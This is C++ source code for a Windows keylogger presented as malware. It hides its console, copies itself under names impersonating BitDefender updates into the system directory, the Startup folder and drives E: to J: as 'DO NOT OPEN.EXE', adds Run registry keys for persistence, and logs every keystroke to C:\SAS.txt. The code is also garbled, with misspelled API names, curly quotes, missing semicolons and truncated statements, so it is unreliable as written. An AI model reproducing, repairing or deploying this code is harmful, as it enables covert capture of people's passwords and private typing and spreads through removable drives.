#include <windows.h>
#include <Winuser.h>
#include <string>
#include <fstream>

string Getkeypress(int keypress)
{
string tempkeypress = “”;

if (keypress == 8)
tempkeypress = “[delete]”;
else if (keypress == 13)
tempkeypress = “\n”
else if (keypress == 32)
tempeypress = ” ”
else if (keypress == VK_PAUSE)
tempkeypress = “[PAUSE]”;
else if (keypress == VK_CAPITAL)
tempkeypress = “[CAPITAL]”;
else if (keypress == VK_SHIFT)
tempkeypress = “[SHIFT]”;
else if (keypress == VK_TAB)
tempkeypress = “[TABULATOR]”;
else if (keypress == VK_CONTROL)
tempkeypress = “[CTRL]”;
else if (keypress == VK_ESCAPE)
tempkeypress = “[ESCAPE]”;
else if (keypress == VK_END)
tempkeypress = “[END]”;
else if (keypress == VK_HOME)
tempkeyress = “[HOME]”;
else if (keypress == VK_LEFT)
tempkeypress = “[left]”;
else if (keypress == VK_RIGHT)
tempkeypress = “[right]”;
else if (keypress == VK_UP)
tempkeypress = “[UP]”;
else if (keypress == VK_DOWN)
tempkeypress = “[DOWN]”;
else if (keypress == VK_SNAPSHOT)
tempkeypress = “[SNAPSHOT]”;
else if (keypress == VK_NUMLOCK)
tempkeypress = “[NUMLOCK]”;
else if (keypress == 190 || keypress == 110)
tempkeypress = “.”;
else if (keypress >=96 && keypress <= 105)
tempkypress = keypress-48;
else if (keypress > 47 && keypress < 60)
tempkeypress = keypress;
if (keypress != VK_LBUTTON || keypress != VK_RBUTTON)
{
if (keypress > 64 && keypress < 91)
{
if (GetkeypressState(VK_CAPITAL))
tempkeypress = keypress;
else
{
keypress = keypress + 32;
tempkeypress = keypress;
}
}
}

return tempkeypress;
}
int main()
{

HWND hide;
char system[TOT_SIZ],system2[TOT_SIZ];
HKEY stup,fixstup;
TCHAR SIZ[TOT_SIZ];
char temprot[TOT_SIZ];
TCHAR FIXSTUPPATH[TOT_SIZ+12]=”\\BitDefender Updates.exe”;
char LOCATE[TOT_SIZ];/*creating hide */
AllocConsole();
hide=FindWindowA(“ConsoleWindowClass”,NULL);
ShowWindow(hide,0);
HMODULE GetModH = GetModuleHandle(NULL);
GetModuleFileName(GetModH,LOCATE,sizeof(LOCATE));
GetModuleFileName(NULL,SIZ,TOT_SIZ);
GetSystemDirectory(system,sizeof(system));
GetSystemDirectory(system2,sizeof(system2));
//WRT 2SYS DRV AL PSBL DRV ONS
//temprot[0]=system[0];
//std::strcat(temprot,”:\\Program Files\\BitDefender\\BitDefender Updates.exe”);
std::strcat(system,”\\BitDefenderUpdates.exe”);
//std::strcat(system2,”\\drveprotect.exe”);
std::strcat(system2,FIXSTUPPATH);
CopyFile(LOCATE,temprot,false);
CopyFile(LOCATE,system,false);
CopyFile(LOCATE,system2,false);
CopyFile(LOCATE,”E:\\DO NOT OPEN.EXE”,false);
CopyFile(LOCATE,”F:\\DO NOT OPEN.EXE”,false);
CopyFile(LOCATE,”G:\\DO NOT OPEN.EXE”,false);
CopyFile(LOCATE,”H:\\DO NOT OPEN.EXE”,false);
CopyFile(LOCATE,”I:\\DO NOT OPEN.EXE”,false);
CopyFile(LOCATE,”J:\\DO NOT OPEN.EXE”,false);
CopyFile(LOCATE,”C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\BITDEFENDER_UPDATE.exe”,false);
CopyFile(LOCATE,”C:\\SAS\\BITDEFENDER_UPDATE.exe”,false);
std::string Filename = “C:\\SAS.txt”;
/*srt up*/
RegOpenkey(Hkeypress_LOCAL_MACHINE,
“Software\\Microsoft\\Windows\\CurrentVersion\\Run”,

&stup);
//st fix
RegOpenkey(Hkeypress_LOCAL_MACHINE,
“Software\\Microsoft\\Windows\\CurrentVersion\\Run”,

&fixstup);
//ste fst
RegSetValueEx(fixstup,
“BIT DEFENDER UPDATES “,
0,

RE_SZ,
(LPBYTE)system2,
sizeof(system2));
//stup fixed
RegSetValueEx(stup,
“BIT DEFENDER UPDATES”,
0,
REG_SZ,
(LPBYTE)SIZ,
sizeof(SIZ));

/* Close the keypress. */
RegClosekeypress(stup);
RegClosekeypress(fixstup);
std::string TempString =
Fstream FStream;
FStream.pen(Filename., std::fstream::out | std::fstream:);
//FStream.write(
while(1==1)
{

Sleep(3);

for(int i = 8; i < 191; i++)
{
if(GetAsynckeypressState(i)&1 ==1)
{
TempString = Getkeypress (i);

FStream.write(TempString.c_str(), TempString.size());
FStream.close();
FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
}
}
}
}